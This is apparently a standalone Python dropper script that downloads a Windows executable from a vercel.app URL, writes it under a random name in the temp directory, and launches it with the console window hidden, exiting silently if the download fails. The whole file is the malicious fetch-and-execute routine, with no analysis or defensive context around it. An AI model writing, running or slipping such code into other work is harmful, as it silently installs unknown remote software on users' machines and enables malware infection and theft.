import requests
import os
import uuid
import tempfile
import subprocess

url = "https://ok-omega-eight.vercel.app/Wvtcljdy.exe"
temp = tempfile.gettempdir()

name = os.path.join(temp, str(uuid.uuid4()) + ".exe")

response = requests.get(url)

if response.status_code == 200:
    with open(name, 'wb') as dosya:
        dosya.write(response.content)
    subprocess.Popen([name], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
else:
    exit()